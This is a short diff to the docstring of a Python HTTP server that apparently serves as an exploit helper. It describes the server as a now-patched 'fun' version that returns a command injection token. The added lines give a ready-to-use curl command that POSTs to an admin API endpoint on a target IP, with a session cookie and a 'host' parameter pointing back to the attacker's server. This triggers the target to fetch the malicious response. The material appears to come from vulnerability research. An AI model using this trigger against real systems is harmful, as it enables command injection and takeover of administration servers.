@@ -4,6 +4,9 @@ Very simple HTTP server for logging requests
 
 This is the "fun" (now patched) version, which returns a command injection access token.
 
+Trigger with the following curl command (remembering to swap out the PHPSESSID and the host IP address, as well as the target IP!): 
+curl -i -s -k -X POST -H 'Referer: http://192.168.96.132/admin/config.php?display=api' -b 'PHPSESSID=js7vp9et13vqjthsb7vcss9nld' --data-binary $'scopes=rest&host=http%3A%2F%2F192.168.96.128:80/' 'http://192.168.96.132/admin/ajax.php?module=api&command=generatedocs'
+
 Usage::
     ./server.py [<port>]
 """
